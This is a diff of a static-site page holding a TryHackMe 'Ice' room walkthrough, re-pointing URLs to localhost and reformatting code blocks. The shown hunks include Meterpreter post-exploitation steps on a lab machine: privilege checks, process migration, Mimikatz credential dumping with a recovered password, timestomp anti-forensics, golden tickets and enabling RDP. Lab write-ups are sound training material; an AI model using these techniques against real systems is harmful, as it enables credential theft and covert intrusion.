@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta http-equiv="X-UA-Compatible" content="ie=edge" />
@@ -13,7 +13,7 @@
 
 
 
-<meta name="author" content="Animesh Roy"  />
+<meta name="author" content="Animesh Roy @anir0y  "  />
 <meta name="description" content="TryHackMe Room ICE solved by Animesh Roy. this is a walkthough. read more..." />
 
 
@@ -34,6 +34,16 @@
 
 
 
+<script type="text/javascript">
+  (function(c,l,a,r,i,t,y){
+      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+  })(window, document, "clarity", "script", "it10lq8bk1");
+</script>
+
+
+
 <meta property="og:type" content="website">
 <meta property="og:url" content="https://classroom.anir0y.in/">
 <meta property="og:title" content="Animesh Roy | Blogs & Writeups">
@@ -41,9 +51,11 @@
 <meta property="og:image" content="https://i.imgur.com/Ji5C41H.png">
 
 
+<script type="text/javascript" charset="UTF-8" src="//cdn.cookie-script.com/s/88cd00f83ae38d0239d06996b1ad293a.js"></script>
+
 
 <meta property="twitter:card" content="summary_large_image">
-<meta property="twitter:url" content="https://classroom.anir0y.in/post/thm-room-ice/">
+<meta property="twitter:url" content="http://localhost:1313/post/thm-room-ice/">
 
 <meta property="twitter:title" content="Animesh Roy | Blogs & Writeups">
 <meta property="twitter:description" content="This blog contents writeups from CTFs and other infosec related posts also some task related to Classroom training">
@@ -63,22 +75,28 @@
 
 
 
-<link rel="canonical" href="https://classroom.anir0y.in/post/thm-room-ice/" />
+<link rel="canonical" href="http://localhost:1313/post/thm-room-ice/" />
 
 
-<meta property="og:title" content="TryHackMe Room Ice" />
-<meta property="og:description" content="TryHackMe Room ICE solved by Animesh Roy. this is a walkthough. read more..." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://classroom.anir0y.in/post/thm-room-ice/" /><meta property="article:section" content="post" />
-<meta property="article:published_time" content="2021-06-29T14:11:50+05:30" />
-<meta property="article:modified_time" content="2021-06-29T14:11:50+05:30" />
+<meta property="og:url" content="http://localhost:1313/post/thm-room-ice/">
+  <meta property="og:site_name" content="Classroom">
+  <meta property="og:title" content="TryHackMe Room Ice">
+  <meta property="og:description" content="TryHackMe Room ICE solved by Animesh Roy. this is a walkthough. read more...">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2021-06-29T14:11:50+05:30">
+    <meta property="article:modified_time" content="2021-06-29T14:11:50+05:30">
+    <meta property="article:tag" content="Tryhackme">
+    <meta property="article:tag" content="Rooms">
+    <meta property="article:tag" content="Thm">
 
 
 
 
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="TryHackMe Room Ice"/>
-<meta name="twitter:description" content="TryHackMe Room ICE solved by Animesh Roy. this is a walkthough. read more..."/>
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="TryHackMe Room Ice">
+  <meta name="twitter:description" content="TryHackMe Room ICE solved by Animesh Roy. this is a walkthough. read more...">
 
 
 <link rel="stylesheet" href="/css/semantic.min.css" />
@@ -153,7 +171,7 @@
     <i class="large link bullseye icon dream-flip-toggle" title="Flip it!"></i>
   </div>
   <div class="item">
-    <i class="large link home icon" title="Home" onclick="window.location.href = 'https:\/\/classroom.anir0y.in'"></i>
+    <i class="large link home icon" title="Home" onclick="window.location.href = 'http:\/\/localhost:1313\/'"></i>
   </div>
   
   <div class="item">
@@ -252,10 +270,10 @@
         <i class="save icon"></i>
       </button>
 
-      <a href="https://twitter.com/intent/tweet?text=TryHackMe%20Room%20Ice&url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fthm-room-ice%2f" class="ui circular twitter icon button">
+      <a href="https://twitter.com/intent/tweet?text=TryHackMe%20Room%20Ice&url=http%3a%2f%2flocalhost%3a1313%2fpost%2fthm-room-ice%2f" class="ui circular twitter icon button">
   <i class="twitter icon"></i>
 </a>
-<a href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fthm-room-ice%2f" class="ui circular facebook icon button">
+<a href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fpost%2fthm-room-ice%2f" class="ui circular facebook icon button">
   <i class="facebook icon"></i>
 </a>
 
@@ -399,13 +417,13 @@
 <ul>
 <li>Dark
 Use <code>ps</code> to list process and you&rsquo;ll find this
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">...<span style="color:#f92672">[</span>snip<span style="color:#f92672">]</span>...
-
- <span style="color:#ae81ff">2292</span>  <span style="color:#ae81ff">1528</span>  Icecast2.exe   x86   <span style="color:#ae81ff">1</span>        Dark-PC<span style="color:#ae81ff">\D</span>ark  C:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\I</span>cecast
-
- <span style="color:#75715e"># your pID might vary</span>
- ...<span style="color:#f92672">[</span>snip<span style="color:#f92672">]</span>...
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>...<span style="color:#f92672">[</span>snip<span style="color:#f92672">]</span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2292</span>  <span style="color:#ae81ff">1528</span>  Icecast2.exe   x86   <span style="color:#ae81ff">1</span>        Dark-PC<span style="color:#ae81ff">\D</span>ark  C:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\I</span>cecast
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#75715e"># your pID might vary</span>
+</span></span><span style="display:flex;"><span> ...<span style="color:#f92672">[</span>snip<span style="color:#f92672">]</span>...
+</span></span></code></pre></div></li>
 </ul>
 <h3 id="43">4.3</h3>
 <blockquote>
@@ -414,15 +432,15 @@ Use <code>ps</code> to list process and you&rsquo;ll find this
 <ul>
 <li>
 <p><code>sysinfo</code> in meterpreter reveal the answer. the ans is:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; sysinfo 
-Computer        : DARK-PC
-OS              : Windows <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>6.1 Build <span style="color:#e6db74">`</span>7601<span style="color:#e6db74">`</span>, Service Pack 1<span style="color:#f92672">)</span>.
-Architecture    : x64
-System Language : en_US
-Domain          : WORKGROUP
-Logged On Users : <span style="color:#ae81ff">2</span>
-Meterpreter     : x86/windows
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; sysinfo 
+</span></span><span style="display:flex;"><span>Computer        : DARK-PC
+</span></span><span style="display:flex;"><span>OS              : Windows <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>6.1 Build <span style="color:#e6db74">`</span>7601<span style="color:#e6db74">`</span>, Service Pack 1<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Architecture    : x64
+</span></span><span style="display:flex;"><span>System Language : en_US
+</span></span><span style="display:flex;"><span>Domain          : WORKGROUP
+</span></span><span style="display:flex;"><span>Logged On Users : <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>Meterpreter     : x86/windows
+</span></span></code></pre></div></li>
 </ul>
 <h3 id="44">4.4</h3>
 <blockquote>
@@ -484,17 +502,17 @@ Meterpreter     : x86/windows
 <ul>
 <li>
 <p><code>SeTakeOwnershipPrivilege</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; getprivs 
-
-Enabled Process Privileges
-<span style="color:#f92672">==========================</span>
-
-Name
-----
-...
-SeTakeOwnershipPrivilege
-...
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; getprivs 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Enabled Process Privileges
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==========================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Name
+</span></span><span style="display:flex;"><span>----
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>SeTakeOwnershipPrivilege
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div></li>
 </ul>
 <hr>
 <h2 id="task-05-looting">Task 05: Looting</h2>
@@ -504,8 +522,8 @@ SeTakeOwnershipPrivilege
 </blockquote>
 <h3 id="52">5.2</h3>
 <blockquote>
-<p>In order to interact with lsass we need to be &lsquo;living in&rsquo; a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it&rsquo;ll restart if we crash it! What&rsquo;s the name of the printer service?
-Mentioned within this question is the term &lsquo;living in&rsquo; a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell.</p>
+<p>In order to interact with lsass we need to be &rsquo;living in&rsquo; a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it&rsquo;ll restart if we crash it! What&rsquo;s the name of the printer service?
+Mentioned within this question is the term &rsquo;living in&rsquo; a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell.</p>
 </blockquote>
 <ul>
 <li><code>spoolsv.exe</code> : run <code>ps</code> to get the process list</li>
@@ -521,23 +539,23 @@ Mentioned within this question is the term &lsquo;living in&rsquo; a process. Of
 <blockquote>
 <p>Let&rsquo;s check what user we are now with the command <code>getuid</code>. What user is listed?</p>
 </blockquote>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; getuid 
-Server username: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
-</code></pre></div><h3 id="55">5.5</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; getuid 
+</span></span><span style="display:flex;"><span>Server username: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
+</span></span></code></pre></div><h3 id="55">5.5</h3>
 <blockquote>
 <p>Now that we&rsquo;ve made our way to full administrator permissions we&rsquo;ll set our sights on looting. Mimikatz is a rather infamous password dumping tool that is incredibly useful. Load it now using the command <code>load kiwi</code> (Kiwi is the updated version of Mimikatz)</p>
 </blockquote>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; load kiwi 
-Loading extension kiwi...
-  .#####.   mimikatz 2.2.0 <span style="color:#ae81ff">20191125</span> <span style="color:#f92672">(</span>x64/windows<span style="color:#f92672">)</span>
-.## ^ <span style="color:#75715e">##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)</span>
-<span style="color:#75715e">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
-<span style="color:#75715e">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
-<span style="color:#e6db74">&#39;## v ##&#39;</span>        Vincent LE TOUX            <span style="color:#f92672">(</span> vincent.letoux@gmail.com <span style="color:#f92672">)</span>
-  <span style="color:#e6db74">&#39;#####&#39;</span>         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/
-
-Success.
-</code></pre></div><h3 id="56">5.6</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; load kiwi 
+</span></span><span style="display:flex;"><span>Loading extension kiwi...
+</span></span><span style="display:flex;"><span>  .#####.   mimikatz 2.2.0 <span style="color:#ae81ff">20191125</span> <span style="color:#f92672">(</span>x64/windows<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>.## ^ <span style="color:#75715e">##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;## v ##&#39;</span>        Vincent LE TOUX            <span style="color:#f92672">(</span> vincent.letoux@gmail.com <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;#####&#39;</span>         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Success.
+</span></span></code></pre></div><h3 id="56">5.6</h3>
 <blockquote>
 <p>Loading kiwi into our meterpreter session will expand our help menu, take a look at the newly added section of the help menu now via the command <code>help</code>.</p>
 </blockquote>
@@ -545,26 +563,26 @@ Success.
 <blockquote>
 <p>Which command allows up to retrieve all credentials?</p>
 </blockquote>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">  Kiwi Commands
-<span style="color:#f92672">=============</span>
-
-    Command                Description
-    -------                -----------
-    creds_all              Retrieve all credentials <span style="color:#f92672">(</span>parsed<span style="color:#f92672">)</span>
-    ...<span style="color:#f92672">[</span>snip<span style="color:#f92672">]</span>...
-</code></pre></div><h3 id="58">5.8</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>  Kiwi Commands
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=============</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Command                Description
+</span></span><span style="display:flex;"><span>    -------                -----------
+</span></span><span style="display:flex;"><span>    creds_all              Retrieve all credentials <span style="color:#f92672">(</span>parsed<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    ...<span style="color:#f92672">[</span>snip<span style="color:#f92672">]</span>...
+</span></span></code></pre></div><h3 id="58">5.8</h3>
 <blockquote>
 <p>Run this command now. What is Dark&rsquo;s password? Mimikatz allows us to steal this password out of memory even without the user &lsquo;Dark&rsquo; logged in as there is a scheduled task that runs the Icecast as the user &lsquo;Dark&rsquo;. It also helps that Windows Defender isn&rsquo;t running on the box ;) (Take a look again at the ps list, this box isn&rsquo;t in the best shape with both the firewall and defender disabled)</p>
 </blockquote>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">kerberos credentials
-<span style="color:#f92672">====================</span>
-
-Username  Domain     Password
---------  ------     --------
-<span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>    <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>     <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
-Dark      Dark-PC    Password01!
-dark-pc$  WORKGROUP  <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
-</code></pre></div><hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>kerberos credentials
+</span></span><span style="display:flex;"><span><span style="color:#f92672">====================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Username  Domain     Password
+</span></span><span style="display:flex;"><span>--------  ------     --------
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>    <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>     <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Dark      Dark-PC    Password01!
+</span></span><span style="display:flex;"><span>dark-pc$  WORKGROUP  <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span></code></pre></div><hr>
 <!-- Google Ads -->
 <p>ads</p>
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
@@ -604,13 +622,13 @@ data-ad-slot="7160066188"></ins></p>
 <p>To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this? Don&rsquo;t ever do this on a pentest unless you&rsquo;re explicitly allowed to do so! This is not beneficial to the defending team as they try to breakdown the events of the pentest after the fact.</p>
 </blockquote>
 <p><code>timestomp</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">Priv: Timestomp Commands
-<span style="color:#f92672">========================</span>
-
-    Command       Description
-    -------       -----------
-    timestomp     Manipulate file MACE attributes
-</code></pre></div><h3 id="66">6.6</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>Priv: Timestomp Commands
+</span></span><span style="display:flex;"><span><span style="color:#f92672">========================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Command       Description
+</span></span><span style="display:flex;"><span>    -------       -----------
+</span></span><span style="display:flex;"><span>    timestomp     Manipulate file MACE attributes
+</span></span></code></pre></div><h3 id="66">6.6</h3>
 <blockquote>
 <p>Mimikatz allows us to create what&rsquo;s called a <code>golden ticket</code>, allowing us to authenticate anywhere with ease. What command allows us to do this?</p>
 </blockquote>
@@ -622,16 +640,15 @@ data-ad-slot="7160066188"></ins></p>
 <blockquote>
 <p>One last thing to note. As we have the password for the user &lsquo;Dark&rsquo; we can now authenticate to the machine and access it via remote desktop (MSRDP). As this is a workstation, we&rsquo;d likely kick whatever user is signed onto it off if we connect to it, however, it&rsquo;s always interesting to remote into machines and view them as their users do. If this hasn&rsquo;t already been enabled, we can enable it via the following Metasploit module: <code>run post/windows/manage/enable_rdp</code></p>
 </blockquote>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">meterpreter &gt; run post/windows/manage/enable_rdp
-
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enabling Remote Desktop
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     RDP is already enabled
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Setting Terminal Services service startup mode
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     The Terminal Services service is not set to auto, changing it to auto ...
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     Opening port in local firewall <span style="color:#66d9ef">if</span> necessary
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> For cleanup execute Meterpreter resource file: /root/.msf4/loot/20210630145839_default_10.10.220.240_host.windows.cle_567279.txt
-
-</code></pre></div><hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>meterpreter &gt; run post/windows/manage/enable_rdp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enabling Remote Desktop
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     RDP is already enabled
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Setting Terminal Services service startup mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     The Terminal Services service is not set to auto, changing it to auto ...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     Opening port in local firewall <span style="color:#66d9ef">if</span> necessary
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> For cleanup execute Meterpreter resource file: /root/.msf4/loot/20210630145839_default_10.10.220.240_host.windows.cle_567279.txt
+</span></span></code></pre></div><hr>
 <!-- Google Ads -->
 <p>ads</p>
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
@@ -661,7 +678,7 @@ data-ad-slot="7160066188"></ins></p>
 
             <footer class="ui basic center aligned segment" style="background-color: transparent;">
               
-              <p>© 2010 - 2023 Classroom</p>
+              <p>© 2010 - 2025 Classroom</p>
               
 
               
@@ -872,7 +889,7 @@ data-ad-slot="7160066188"></ins></p>
 </div>
 <script>
   $(document).ready(function () {
-    $.getJSON('https:\/\/classroom.anir0y.in/index.json', function (data) {
+    $.getJSON('http:\/\/localhost:1313\//index.json', function (data) {
       $('.ui.search').search({
         source: data,
         searchFields: ['title'],
